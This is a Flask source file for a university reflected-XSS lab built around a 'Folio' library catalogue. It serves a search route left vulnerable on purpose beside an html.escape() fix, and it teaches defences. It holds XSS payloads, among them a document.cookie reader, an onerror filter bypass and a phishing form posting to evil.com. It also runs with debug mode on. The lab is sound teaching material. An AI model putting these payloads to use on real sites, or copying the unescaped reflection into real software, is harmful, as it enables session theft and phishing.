"""
=============================================================================
  Reflected XSS Lab  -  "Folio" Library Catalogue
  Cyber Security (IT-30001) - Web Server Security Assignment
  Member: Bhavay (IIT2024057) | Category: XSS | Variant: Reflected XSS
=============================================================================

Two versions of the same catalogue search are served side by side:

  /search/vulnerable  -> the ?q= value is reflected into the page RAW
  /search/safe        -> the ?q= value is HTML-encoded with html.escape()

Run:
    python app.py
Then open:
    http://127.0.0.1:5000/
=============================================================================
"""

from urllib.parse import quote

from flask import Flask, request
import html as html_mod  # Used for mitigation (output encoding)

app = Flask(__name__)

# --- Fake book catalogue (simulating a database) ----------------------------
BOOKS = [
    {"id": 101, "name": "The Web Application Hacker's Handbook", "author": "Stuttard & Pinto", "year": 2011, "shelf": "SEC-04"},
    {"id": 102, "name": "Computer Networking: A Top-Down Approach", "author": "Kurose & Ross", "year": 2021, "shelf": "NET-11"},
    {"id": 103, "name": "Applied Cryptography", "author": "Bruce Schneier", "year": 1996, "shelf": "CRY-02"},
    {"id": 104, "name": "The Tangled Web", "author": "Michal Zalewski", "year": 2011, "shelf": "SEC-09"},
    {"id": 105, "name": "Operating System Concepts", "author": "Silberschatz et al.", "year": 2018, "shelf": "OS-03"},
    {"id": 106, "name": "Security Engineering", "author": "Ross Anderson", "year": 2020, "shelf": "SEC-01"},
]

SPINE_COLOURS = ["#3d5a80", "#9c6644", "#5f0f40", "#386641", "#6d597a", "#bc4749"]


# =============================================================================
#  SHARED STYLESHEET  (plain string - no f-string brace escaping needed)
# =============================================================================

STYLES = """
:root {
  --paper: #f5f0e6;
  --paper-2: #ece4d3;
  --card: #fffdf8;
  --ink: #1f1c17;
  --ink-soft: #5c554a;
  --rule: #d9cfbb;
  --danger: #b3261e;
  --danger-tint: #fbe9e7;
  --safe: #1f6f43;
  --safe-tint: #e5f2ea;
  --gold: #a8741a;
  --mono: ui-monospace, "SF Mono", Menlo, Consolas, "Courier New", monospace;
  --serif: Georgia, "Iowan Old Style", "Palatino Linotype", serif;
  --sans: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
}
body.mode-vulnerable { --accent: var(--danger); --accent-tint: var(--danger-tint); }
body.mode-safe       { --accent: var(--safe);   --accent-tint: var(--safe-tint); }
body.mode-home       { --accent: var(--ink);    --accent-tint: var(--paper-2); }

* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: var(--sans); background: var(--paper); color: var(--ink);
  line-height: 1.55; min-height: 100vh;
}
a { color: inherit; }
code, pre { font-family: var(--mono); }

/* ---------- top bar ---------- */
.topbar {
  position: sticky; top: 0; z-index: 10;
  display: flex; align-items: center; justify-content: space-between; gap: 16px;
  padding: 14px 32px; background: var(--card);
  border-bottom: 3px double var(--rule);
}
.brand { display: flex; align-items: baseline; gap: 10px; text-decoration: none; }
.brand .logo {
  font-family: var(--serif); font-size: 1.5rem; font-weight: 700; letter-spacing: .5px;
}
.brand .logo span { color: var(--gold); }
.brand .tagline { font-size: .78rem; color: var(--ink-soft); text-transform: uppercase; letter-spacing: 1.5px; }
.switch {
  display: inline-flex; border: 1px solid var(--rule); border-radius: 999px;
  padding: 3px; background: var(--paper);
}
.switch a {
  text-decoration: none; font-size: .82rem; font-weight: 600;
  padding: 6px 14px; border-radius: 999px; color: var(--ink-soft);
}
.switch a.on-vulnerable { background: var(--danger); color: #fff; }
.switch a.on-safe       { background: var(--safe);   color: #fff; }

/* ---------- status ribbon ---------- */
.ribbon {
  display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
  padding: 10px 32px; background: var(--accent-tint);
  border-bottom: 1px solid var(--rule); font-size: .88rem;
}
.ribbon .dot { width: 10px; height: 10px; border-radius: 50%; background: var(--accent); }
.ribbon strong { color: var(--accent); letter-spacing: .5px; }
.ribbon code { background: var(--card); padding: 1px 6px; border-radius: 4px; border: 1px solid var(--rule); }

/* ---------- page shell ---------- */
.shell { max-width: 1180px; margin: 0 auto; padding: 32px; }
.grid { display: grid; grid-template-columns: minmax(0, 1.55fr) minmax(0, 1fr); gap: 28px; align-items: start; }
@media (max-width: 900px) {
  .grid { grid-template-columns: 1fr; }
  .shell { padding: 20px 16px; }
  .topbar, .ribbon { padding-left: 16px; padding-right: 16px; }
  .brand .tagline { display: none; }
}

.panel {
  background: var(--card); border: 1px solid var(--rule); border-radius: 4px;
  padding: 22px 24px; margin-bottom: 24px;
  box-shadow: 0 1px 0 var(--rule), 0 8px 18px -14px rgba(60, 40, 10, .35);
}
.kicker {
  font-size: .72rem; font-weight: 700; text-transform: uppercase; letter-spacing: 2px;
  color: var(--gold); margin-bottom: 6px;
}
.panel h2, .panel h3 { font-family: var(--serif); font-weight: 700; }
.panel h2 { font-size: 1.45rem; margin-bottom: 14px; }
.panel h3 { font-size: 1.12rem; margin-bottom: 10px; }
.muted { color: var(--ink-soft); font-size: .9rem; }

/* ---------- search ---------- */
.searchbar { display: flex; border: 2px solid var(--ink); border-radius: 4px; overflow: hidden; background: #fff; }
.searchbar input {
  flex: 1; min-width: 0; border: 0; padding: 14px 16px; font-size: 1rem;
  font-family: var(--mono); background: transparent; color: var(--ink);
}
.searchbar input:focus { outline: none; background: #fffcf2; }
.searchbar button {
  border: 0; padding: 0 22px; font-weight: 700; font-size: .95rem; cursor: pointer;
  background: var(--accent); color: #fff; letter-spacing: .5px;
}
.hint { margin-top: 10px; font-size: .82rem; color: var(--ink-soft); }
.hint kbd { font-family: var(--mono); background: var(--paper-2); padding: 1px 6px; border-radius: 3px; }

/* ---------- results ---------- */
.results-head {
  font-family: var(--serif); font-size: 1.2rem; padding-bottom: 12px; margin-bottom: 16px;
  border-bottom: 1px dashed var(--rule); word-break: break-word;
}
.results-query { color: var(--accent); font-style: italic; }
.books { display: grid; grid-template-columns: repeat(auto-fill, minmax(190px, 1fr)); gap: 14px; }
.book {
  display: flex; border: 1px solid var(--rule); border-radius: 3px; overflow: hidden; background: var(--paper);
}
.book .spine { width: 14px; flex-shrink: 0; }
.book .body { padding: 10px 12px; }
.book .title { font-family: var(--serif); font-weight: 700; font-size: .95rem; line-height: 1.3; }
.book .meta { font-size: .78rem; color: var(--ink-soft); margin-top: 4px; }
.book .shelf {
  display: inline-block; margin-top: 8px; font-family: var(--mono); font-size: .72rem;
  border: 1px solid var(--rule); padding: 1px 6px; border-radius: 2px; background: var(--card);
}
.empty {
  text-align: center; padding: 26px 10px; color: var(--ink-soft);
  border: 1px dashed var(--rule); border-radius: 4px; font-style: italic;
}

/* ---------- request / echo inspector ---------- */
.inspector dt { font-size: .72rem; text-transform: uppercase; letter-spacing: 1.5px; color: var(--ink-soft); margin-top: 12px; }
.inspector dt:first-child { margin-top: 0; }
.inspector dd {
  margin-top: 4px; font-family: var(--mono); font-size: .8rem; background: #23201b; color: #f3ead7;
  padding: 10px 12px; border-radius: 3px; word-break: break-all; white-space: pre-wrap;
}
.inspector dd .hl { color: #ffb4a8; }
body.mode-safe .inspector dd .hl { color: #9fe0b6; }

/* ---------- payload drawer ---------- */
.payload { border-top: 1px solid var(--rule); padding: 12px 0; }
.payload:first-of-type { border-top: 0; padding-top: 0; }
.payload .row { display: flex; justify-content: space-between; align-items: center; gap: 10px; }
.payload .name { font-weight: 600; font-size: .9rem; }
.payload .num {
  display: inline-grid; place-items: center; width: 22px; height: 22px; border-radius: 50%;
  background: var(--ink); color: var(--paper); font-size: .72rem; margin-right: 6px;
}
.payload pre {
  margin-top: 6px; font-size: .76rem; background: var(--paper); border-left: 3px solid var(--gold);
  padding: 6px 10px; white-space: pre-wrap; word-break: break-all;
}
.payload .actions { display: flex; gap: 6px; flex-shrink: 0; }
.btn {
  font: inherit; font-size: .74rem; font-weight: 700; text-decoration: none; cursor: pointer;
  padding: 4px 10px; border-radius: 3px; border: 1px solid var(--ink); background: transparent; color: var(--ink);
}
.btn.fill { background: var(--accent); border-color: var(--accent); color: #fff; }

/* ---------- source view ---------- */
.source { background: #23201b; color: #e9e1cf; border-radius: 3px; font-size: .8rem; overflow-x: auto; padding: 10px 0; }
.source .ln { display: block; padding: 1px 14px; white-space: pre; }
.source .ln::before {
  content: attr(data-n); display: inline-block; width: 28px; color: #7d7464; user-select: none;
}
.source .ln.flag { background: rgba(255, 255, 255, .08); border-left: 3px solid var(--accent); }
.source .c { color: #9b917e; }
.source .k { color: #e6b450; }
.cause {
  margin-top: 14px; padding: 12px 14px; background: var(--accent-tint);
  border-left: 4px solid var(--accent); font-size: .9rem;
}

/* ---------- home ---------- */
.hero { padding: 26px 0 30px; border-bottom: 3px double var(--rule); margin-bottom: 30px; }
.hero h1 { font-family: var(--serif); font-size: clamp(2rem, 4.5vw, 3.1rem); line-height: 1.12; max-width: 780px; }
.hero h1 em { color: var(--danger); font-style: italic; }
.hero p { max-width: 680px; margin-top: 14px; color: var(--ink-soft); font-size: 1.05rem; }
.idcard {
  display: inline-flex; gap: 18px; flex-wrap: wrap; margin-top: 20px; padding: 10px 16px;
  border: 1px solid var(--rule); background: var(--card); font-size: .85rem;
}
.idcard b { font-family: var(--mono); }

.flow { list-style: none; display: grid; grid-template-columns: repeat(4, 1fr); gap: 0; counter-reset: step; }
.flow li { position: relative; padding: 16px 18px 16px 0; counter-increment: step; }
.flow li::before {
  content: counter(step, upper-roman); display: block; font-family: var(--serif); font-size: 1.6rem;
  color: var(--gold); margin-bottom: 6px;
}
.flow li + li { border-left: 1px dashed var(--rule); padding-left: 18px; }
.flow b { display: block; margin-bottom: 4px; }
.flow span { font-size: .86rem; color: var(--ink-soft); }
@media (max-width: 900px) {
  .flow { grid-template-columns: 1fr 1fr; }
  .flow li + li { border-left: 0; padding-left: 0; }
}

.doors { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 24px; }
@media (max-width: 700px) { .doors { grid-template-columns: 1fr; } }
.door {
  display: block; text-decoration: none; background: var(--card); border: 1px solid var(--rule);
  border-top: 6px solid var(--c); padding: 22px 24px; border-radius: 4px; transition: transform .15s, box-shadow .15s;
}
.door:hover { transform: translateY(-3px); box-shadow: 0 14px 24px -18px rgba(0, 0, 0, .5); }
.door .label { font-size: .72rem; font-weight: 800; letter-spacing: 2px; color: var(--c); text-transform: uppercase; }
.door h3 { font-family: var(--serif); font-size: 1.35rem; margin: 6px 0 8px; }
.door p { font-size: .92rem; color: var(--ink-soft); }
.door .go { display: inline-block; margin-top: 14px; font-weight: 700; color: var(--c); }
.door.v { --c: var(--danger); }
.door.s { --c: var(--safe); }

table.check { width: 100%; border-collapse: collapse; font-size: .9rem; }
table.check th, table.check td { text-align: left; padding: 10px 8px; border-bottom: 1px solid var(--rule); vertical-align: top; }
table.check th { font-size: .72rem; text-transform: uppercase; letter-spacing: 1.5px; color: var(--ink-soft); }
table.check td:first-child { font-family: var(--serif); font-weight: 700; color: var(--gold); width: 42px; }

.theory { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 14px; }
.theory article { border: 1px solid var(--rule); padding: 14px 16px; background: var(--paper); border-radius: 3px; }
.theory article.done { border-color: var(--safe); background: var(--safe-tint); }
.theory h4 { font-family: var(--serif); font-size: 1rem; margin-bottom: 6px; display: flex; justify-content: space-between; gap: 8px; }
.theory h4 small { font-family: var(--sans); font-size: .66rem; font-weight: 800; letter-spacing: 1px; color: var(--safe); white-space: nowrap; }
.theory p { font-size: .86rem; color: var(--ink-soft); }

footer { text-align: center; font-size: .8rem; color: var(--ink-soft); padding: 10px 0 40px; }
"""


# =============================================================================
#  LAYOUT HELPERS
# =============================================================================

def render_layout(title, body_html, mode, query=None):
    """Wrap page content in the shared header / ribbon / footer."""
    q_param = "" if query is None else "?q=" + quote(query, safe="")
    vuln_cls = "on-vulnerable" if mode == "vulnerable" else ""
    safe_cls = "on-safe" if mode == "safe" else ""

    if mode == "vulnerable":
        ribbon = (
            '<div class="ribbon"><span class="dot"></span>'
            "<strong>VULNERABLE BUILD</strong>"
            "<span>Output encoding is <b>OFF</b> &mdash; the <code>q</code> parameter is echoed into the HTML exactly as received.</span>"
            "</div>"
        )
    elif mode == "safe":
        ribbon = (
            '<div class="ribbon"><span class="dot"></span>'
            "<strong>MITIGATED BUILD</strong>"
            "<span>Output encoding is <b>ON</b> &mdash; the <code>q</code> parameter passes through <code>html.escape()</code> before rendering.</span>"
            "</div>"
        )
    else:
        ribbon = ""

    switch = ""
    if mode in ("vulnerable", "safe"):
        switch = (
            '<nav class="switch" aria-label="Switch build">'
            f'<a class="{vuln_cls}" href="/search/vulnerable{q_param}" title="Open this same request on the vulnerable build">Vulnerable</a>'
            f'<a class="{safe_cls}" href="/search/safe{q_param}" title="Open this same request on the mitigated build">Mitigated</a>'
            "</nav>"
        )

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{title}</title>
<style>{STYLES}</style>
</head>
<body class="mode-{mode}">
<header class="topbar">
  <a class="brand" href="/">
    <span class="logo">Folio<span>.</span></span>
    <span class="tagline">Library catalogue &middot; Reflected XSS lab</span>
  </a>
  {switch}
</header>
{ribbon}
<main class="shell">
{body_html}
</main>
<footer>
  Bhavay &middot; IIT2024057 &middot; Cross-Site Scripting (Reflected) &mdash;
  for authorised, local testing only.
</footer>
</body>
</html>"""


# =============================================================================
#  HOME PAGE
# =============================================================================

HOME_BODY = """
<section class="hero">
  <div class="kicker">Cyber Security IT-30001 &middot; Web Server Security</div>
  <h1>A search box that <em>repeats what you type</em> &mdash; and what happens when it shouldn't.</h1>
  <p>
    Folio is a small library catalogue. Its search page echoes your query back as
    &ldquo;Results for &hellip;&rdquo;. In the vulnerable build that echo is raw HTML, so a
    crafted link can run JavaScript in the victim's browser. The mitigated build encodes
    the echo, and the same link becomes harmless text.
  </p>
  <div class="idcard">
    <span>Member <b>Bhavay</b></span>
    <span>Roll <b>IIT2024057</b></span>
    <span>Category <b>XSS</b></span>
    <span>Variant <b>Reflected</b></span>
  </div>
</section>

<section class="panel">
  <div class="kicker">How the attack travels</div>
  <ol class="flow">
    <li><b>Craft</b><span>The attacker puts a script into the <code>?q=</code> parameter of a Folio search link.</span></li>
    <li><b>Deliver</b><span>The link is sent to a victim by email, chat or a forum post.</span></li>
    <li><b>Reflect</b><span>Folio's server copies <code>q</code> straight into the HTML response.</span></li>
    <li><b>Execute</b><span>The victim's browser parses the echo as markup and runs the script on Folio's origin.</span></li>
  </ol>
</section>

<div class="doors">
  <a class="door v" href="/search/vulnerable">
    <span class="label">Build A &middot; exploitable</span>
    <h3>Vulnerable catalogue</h3>
    <p>The query is reflected without any encoding. Every payload in the drawer executes.</p>
    <span class="go">Open search &rarr;</span>
  </a>
  <a class="door s" href="/search/safe">
    <span class="label">Build B &middot; secured</span>
    <h3>Mitigated catalogue</h3>
    <p>Identical page, but the query is passed through <code>html.escape()</code> first. Payloads print as text.</p>
    <span class="go">Open search &rarr;</span>
  </a>
</div>

<section class="panel">
  <div class="kicker">Assignment coverage</div>
  <h2>Where each requirement is shown</h2>
  <table class="check">
    <tr><th></th><th>Requirement</th><th>Where to find it</th></tr>
    <tr><td>(a)</td><td>Vulnerable implementation</td><td><code>/search/vulnerable</code> &mdash; <code>query_display = query</code> in <code>search_vulnerable()</code>, also shown in the &ldquo;Server code&rdquo; panel.</td></tr>
    <tr><td>(b)</td><td>Working exploit</td><td>Payload drawer on the search page: five ready payloads, each runnable in one click.</td></tr>
    <tr><td>(c)</td><td>Root cause</td><td>The &ldquo;Why it happens&rdquo; note under the server code.</td></tr>
    <tr><td>(d)</td><td>Mitigation implemented</td><td><code>/search/safe</code> &mdash; context-aware output encoding with <code>html.escape(query)</code>. Use the top-right switch to replay the same payload.</td></tr>
    <tr><td>(e)</td><td>Other mitigations (theory)</td><td>The section below.</td></tr>
  </table>
</section>

<section class="panel">
  <div class="kicker">(e) Defences against XSS</div>
  <h2>Implemented fix and the alternatives</h2>
  <div class="theory">
    <article class="done">
      <h4>Context-aware output encoding <small>IMPLEMENTED</small></h4>
      <p>Characters with meaning in HTML (<code>&lt; &gt; &amp; " '</code>) are turned into entities before the value is placed in the page, so the browser shows them as text instead of parsing them as tags.</p>
    </article>
    <article>
      <h4>Framework auto-escaping</h4>
      <p>Template engines such as Jinja2 encode every <code>{{ variable }}</code> by default, so a developer has to opt out on purpose instead of remembering to opt in.</p>
    </article>
    <article>
      <h4>HTML sanitiser for rich content</h4>
      <p>When users must submit HTML, a sanitiser like DOMPurify or Bleach parses it and keeps only an allow-list of safe tags and attributes, dropping <code>&lt;script&gt;</code> and <code>on*</code> handlers.</p>
    </article>
    <article>
      <h4>Content Security Policy</h4>
      <p>A <code>Content-Security-Policy</code> header tells the browser which script sources are allowed. With inline scripts blocked, an injected payload is refused even if it reaches the page.</p>
    </article>
    <article>
      <h4>HttpOnly cookies</h4>
      <p>Session cookies flagged <code>HttpOnly</code> cannot be read through <code>document.cookie</code>, which limits the damage of a successful injection that tries to steal the session.</p>
    </article>
    <article>
      <h4>Safe DOM sinks</h4>
      <p>In client-side code, writing untrusted data with <code>textContent</code> instead of <code>innerHTML</code> keeps it as text and closes the DOM-based variant of XSS.</p>
    </article>
  </div>
</section>
"""


# =============================================================================
#  SEARCH-PAGE COMPONENTS
# =============================================================================

PAYLOADS = [
    ("Script alert", "Proves script execution", "<script>alert('XSS')</script>"),
    ("Cookie theft", "Reads document.cookie", "<script>alert('Cookies: '+document.cookie)</script>"),
    ("Image onerror", "Bypasses naive <script> filters", "<img src=x onerror=alert('XSS-via-img')>"),
    ("Defacement", "HTML injection", '<h1 style="color:red">HACKED!</h1>'),
    ("Fake login", "Phishing form injected into the page",
     '<form action="https://evil.com/steal"><input placeholder="Enter password"><button>Login</button></form>'),
]


def _payload_drawer(version):
    """Clickable payload list. Payload text is always escaped for DISPLAY here;
    only the ?q= link carries the raw payload to the server."""
    items = ""
    for i, (name, desc, payload) in enumerate(PAYLOADS, 1):
        href = f"/search/{version}?q={quote(payload, safe='')}"
        shown = html_mod.escape(payload)
        items += f"""
        <div class="payload">
          <div class="row">
            <div><span class="num">{i}</span><span class="name">{name}</span>
              <div class="muted" style="font-size:.78rem;margin-left:28px">{html_mod.escape(desc)}</div></div>
            <div class="actions">
              <button class="btn" type="button" data-payload="{html_mod.escape(payload, quote=True)}" onclick="loadPayload(this)">Load</button>
              <a class="btn fill" href="{href}">Run</a>
            </div>
          </div>
          <pre>{shown}</pre>
        </div>"""
    return f"""
    <section class="panel">
      <div class="kicker">Exploit drawer</div>
      <h3>Test payloads</h3>
      <p class="muted" style="margin-bottom:14px"><b>Load</b> puts the payload in the search box; <b>Run</b> opens the crafted link directly, as a victim would.</p>
      {items}
    </section>"""


def _source_panel(is_safe):
    """Read-only view of the route code with the critical line highlighted."""
    if is_safe:
        lines = [
            ('<span class="k">@app.route</span>("/search/safe")', False),
            ('<span class="k">def</span> search_safe():', False),
            ('    query = request.args.get("q", None)', False),
            ('    <span class="c"># &lt; becomes &amp;lt;   &gt; becomes &amp;gt;   &amp; becomes &amp;amp;</span>', False),
            ('    query_display = html_mod.escape(query)  <span class="c"># THE FIX</span>', True),
            ('    ...', False),
            ('    <span class="k">return</span> build_search_page(query_display, ...)', False),
        ]
        cause = (
            "<b>Why the payload fails:</b> <code>html.escape()</code> converts the special "
            "characters into entities. The browser renders <code>&amp;lt;script&amp;gt;</code> as the "
            "visible characters <code>&lt;script&gt;</code>, never as a tag, so nothing executes."
        )
    else:
        lines = [
            ('<span class="k">@app.route</span>("/search/vulnerable")', False),
            ('<span class="k">def</span> search_vulnerable():', False),
            ('    query = request.args.get("q", None)', False),
            ('    <span class="c"># raw user input, no encoding</span>', False),
            ('    query_display = query  <span class="c"># THE VULNERABILITY</span>', True),
            ('    ...', False),
            ('    <span class="k">return</span> build_search_page(query_display, ...)', False),
        ]
        cause = (
            "<b>Why it happens:</b> user-controlled input is concatenated into the HTML "
            "response without output encoding, so the browser parses <code>&lt;script&gt;</code> "
            "and event-handler attributes in it as real markup and runs them."
        )
    body = "".join(
        f'<span class="ln{" flag" if flag else ""}" data-n="{n}">{text}</span>'
        for n, (text, flag) in enumerate(lines, 1)
    )
    return f"""
    <section class="panel">
      <div class="kicker">{"(d) Mitigation" if is_safe else "(a) Vulnerable code path"}</div>
      <h3>Server code &mdash; app.py</h3>
      <pre class="source">{body}</pre>
      <div class="cause">{cause}</div>
    </section>"""


def _inspector(raw_query, inserted, version):
    """Shows the request URL and the exact markup the server inserted.
    Everything here is escaped for DISPLAY so the inspector itself is never an injection point."""
    if raw_query is None:
        return """
    <section class="panel inspector">
      <div class="kicker">Request inspector</div>
      <h3>Nothing sent yet</h3>
      <p class="muted">Run a search or a payload to see the request and what the server echoed back.</p>
    </section>"""
    url = f"/search/{version}?q={quote(raw_query, safe='')}"
    return f"""
    <section class="panel inspector">
      <div class="kicker">Request inspector</div>
      <h3>What crossed the wire</h3>
      <dl>
        <dt>Crafted URL</dt>
        <dd>GET {html_mod.escape(url)}</dd>
        <dt>Decoded q</dt>
        <dd>{html_mod.escape(raw_query)}</dd>
        <dt>Inserted into the HTML</dt>
        <dd>&lt;span class="results-query"&gt;<span class="hl">{html_mod.escape(inserted)}</span>&lt;/span&gt;</dd>
      </dl>
    </section>"""


def _book_cards(matches, escape_names):
    if not matches:
        return '<p class="empty">No titles on the shelves match this search.</p>'
    cards = ""
    for p in matches:
        name = html_mod.escape(p["name"]) if escape_names else p["name"]
        author = html_mod.escape(p["author"]) if escape_names else p["author"]
        colour = SPINE_COLOURS[p["id"] % len(SPINE_COLOURS)]
        cards += f"""
        <div class="book">
          <div class="spine" style="background:{colour}"></div>
          <div class="body">
            <div class="title">{name}</div>
            <div class="meta">{author} &middot; {p["year"]}</div>
            <span class="shelf">#{p["id"]} &middot; {p["shelf"]}</span>
          </div>
        </div>"""
    return f'<div class="books">{cards}</div>'


def build_search_page(query_display, results_html, version, is_safe, raw_query=None):
    """Build the complete search page HTML."""
    results_section = ""
    if query_display is not None:
        # query_display is inserted here verbatim. On the vulnerable build it is
        # the raw user input; on the safe build it has already been escaped.
        results_section = (
            '<section class="panel">'
            '<div class="kicker">Catalogue results</div>'
            f'<h2 class="results-head">Results for &ldquo;<span class="results-query">{query_display}</span>&rdquo;</h2>'
            f"{results_html}"
            "</section>"
        )

    search_panel = f"""
    <section class="panel">
      <div class="kicker">Search the stacks</div>
      <h2>Find a book</h2>
      <form class="searchbar" method="GET" action="/search/{version}">
        <input id="q" type="text" name="q" autocomplete="off"
               placeholder="Title keyword, e.g. Web, Security, Cryptography">
        <button type="submit">Search</button>
      </form>
      <p class="hint">Try <kbd>Security</kbd> for a normal search, then a payload from the drawer.</p>
    </section>"""

    body = f"""
<div class="grid">
  <div>
    {search_panel}
    {results_section}
    {_source_panel(is_safe)}
  </div>
  <aside>
    {_inspector(raw_query, query_display if query_display is not None else "", version)}
    {_payload_drawer(version)}
  </aside>
</div>
<script>
  function loadPayload(btn) {{
    var box = document.getElementById("q");
    box.value = btn.getAttribute("data-payload");
    box.focus();
    window.scrollTo({{ top: 0, behavior: "smooth" }});
  }}
</script>"""

    title = f"Folio search - {'Mitigated' if is_safe else 'Vulnerable'}"
    return render_layout(title, body, version, raw_query)


# =============================================================================
#  ROUTE: Home
# =============================================================================

@app.route("/")
def home():
    return render_layout("Folio - Reflected XSS Lab", HOME_BODY, "home")


# =============================================================================
#  ROUTE: VULNERABLE Search
#  Flaw: User input from ?q= is reflected directly into the HTML response
#        without any encoding or sanitization.
# =============================================================================

@app.route("/search/vulnerable")
def search_vulnerable():
    query = request.args.get("q", None)

    if query is None:
        return build_search_page(None, "", "vulnerable", is_safe=False)

    # ------------------------------------------------------------------
    #  VULNERABLE LINE: query is used AS-IS, no html.escape()!
    #  Root cause: User-controlled input is concatenated directly into
    #  the HTML response. The browser parses it as markup/script.
    # ------------------------------------------------------------------
    query_display = query  # <- THIS IS THE VULNERABILITY

    # Filter books (case-insensitive substring match on the title)
    matches = [p for p in BOOKS if query.lower() in p["name"].lower()]
    results_html = _book_cards(matches, escape_names=False)

    return build_search_page(query_display, results_html, "vulnerable",
                             is_safe=False, raw_query=query)


# =============================================================================
#  ROUTE: SAFE (Mitigated) Search
#  Fix:   html.escape() is applied to the query before embedding in HTML.
#         This is "context-aware output encoding" - the primary XSS defence.
# =============================================================================

@app.route("/search/safe")
def search_safe():
    query = request.args.get("q", None)

    if query is None:
        return build_search_page(None, "", "safe", is_safe=True)

    # ------------------------------------------------------------------
    #  MITIGATED LINE: html.escape() encodes special HTML chars
    #      <  -> &lt;   >  -> &gt;   &  -> &amp;   "  -> &quot;   '  -> &#x27;
    #  The browser sees encoded entities and renders them as plain text,
    #  NOT as executable HTML or JavaScript.
    # ------------------------------------------------------------------
    query_display = html_mod.escape(query)  # <- THIS IS THE FIX

    # Filter books - same logic, safe display
    matches = [p for p in BOOKS if query.lower() in p["name"].lower()]
    results_html = _book_cards(matches, escape_names=True)

    return build_search_page(query_display, results_html, "safe",
                             is_safe=True, raw_query=query)


# =============================================================================

if __name__ == "__main__":
    print("=" * 60)
    print("  Folio - Reflected XSS Lab")
    print("  Open http://127.0.0.1:5000/ in your browser")
    print("=" * 60)
    app.run(debug=True, port=5000)
